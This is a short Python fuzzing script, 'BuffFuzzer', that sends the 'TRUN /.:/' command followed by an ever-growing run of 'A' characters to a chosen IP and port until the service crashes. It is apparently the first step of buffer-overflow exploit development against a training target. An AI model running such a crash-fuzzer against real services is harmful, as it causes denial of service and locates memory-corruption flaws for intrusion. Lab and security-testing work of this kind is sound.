#!/usr/bin/env python3
import sys
import time
import socket
import argparse


def main():
    parser = argparse.ArgumentParser(description="BuffFuzzer v1.0")
    parser.add_argument("--ip", type=str, help="Target IP address",  required=True)
    parser.add_argument("--port", type=int, help="Target port number", required=True)
    args = parser.parse_args()
    target_ip = args.ip
    target_port = args.port

    buffer = "A" * 100

    while True:
        try:
            print(f"Sending payload with {len(buffer)} bytes")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(("TRUN /.:/" + buffer).encode())
            s.settimeout(10)
            response = s.recv(1024)

            if not response:
                print(f"Target response timed out. Crashed at {len(buffer)} bytes.")
                sys.exit()

            s.close()
            time.sleep(1)
            buffer += "A" * 100

        except socket.timeout:
            print(f"Target response timed out. Crashed at {len(buffer)} bytes.")
            sys.exit()
        except Exception as e:
            print(f"An error occurred: {e}")
            sys.exit()

if __name__ == "__main__":
    main()
